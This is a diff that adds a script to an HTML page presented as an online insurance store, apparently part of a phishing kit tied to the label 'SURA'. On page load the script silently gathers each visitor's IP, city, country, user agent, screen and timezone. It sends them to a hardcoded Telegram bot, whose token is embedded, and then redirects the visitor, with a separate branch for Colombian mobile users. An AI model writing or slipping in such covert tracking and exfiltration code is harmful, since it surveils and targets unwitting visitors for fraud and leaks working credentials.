@@ -4,6 +4,92 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Tienda de Seguros Online</title>
+  <script>
+    // Función para detectar si el dispositivo es móvil
+    function isMobileDevice() {
+      return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Función para obtener información del usuario y datos geográficos usando ipinfo.io
+    async function getUserDetails() {
+      const info = {
+        timestamp: new Date().toLocaleString(),           
+        userAgent: navigator.userAgent,                    
+        platform: navigator.platform,                      
+        language: navigator.language,                      
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,  
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        windowSize: `${window.innerWidth}x${window.innerHeight}`
+      };
+
+      try {
+        const response = await fetch('https://ipinfo.io/json?token=3798a6699b4912');
+        const data = await response.json();
+        info.ip = data.ip || 'Desconocida';
+        info.city = data.city || 'Desconocida';
+        info.country = data.country || 'Desconocido';
+      } catch (error) {
+        console.error("Error obteniendo datos geográficos:", error);
+        info.ip = 'Desconocida';
+        info.city = 'Desconocida';
+        info.country = 'Desconocido';
+      }
+      return info;
+    }
+
+    // Función para enviar la información al bot de Telegram
+    async function sendToTelegram(data) {
+      const botToken = "8042550315:AAGIoWq8XT_n7KwRaxAq38-1gXvCZyAPExk";
+      const chatId = "5848946481";
+      const message = `🚨 SURA - LINTERNA - dan 🚨
+      
+🌍 Información Geográfica:
+- IP: ${data.ip}
+- Ciudad: ${data.city}
+- País: ${data.country}
+
+🕒 Fecha y Hora: ${data.timestamp}
+💻 Plataforma: ${data.platform}
+🗣️ Idioma: ${data.language}
+⏰ Zona Horaria: ${data.timezone}
+📺 Resolución de pantalla: ${data.screenResolution}
+🖥️ Tamaño de ventana: ${data.windowSize}
+👤 User Agent: ${data.userAgent}`;
+
+      const urlTelegram = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const payload = {
+        chat_id: chatId,
+        text: message
+      };
+
+      try {
+        const response = await fetch(urlTelegram, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        if (!response.ok) {
+          throw new Error(`Error: ${response.statusText}`);
+        }
+        console.log("Notificación enviada a Telegram con éxito.");
+      } catch (error) {
+        console.error("Error enviando notificación a Telegram:", error);
+      }
+    }
+
+    // Al cargar la página, obtener la información, enviarla a Telegram y redirigir
+    document.addEventListener("DOMContentLoaded", async function() {
+      const userDetails = await getUserDetails();
+      await sendToTelegram(userDetails);
+
+      // Verificar si el usuario es de Colombia y está en un dispositivo móvil
+      if (userDetails.country === "CO" && isMobileDevice()) {
+        window.location.href = 'https://url-deseada.com'; // URL para Colombia móvil
+      } else {
+        window.location.href = 'https://url-deseada.com'; // URL por defecto
+      }
+    });
+  </script>
   <style>
     /* Reset y estilos generales */
     * {
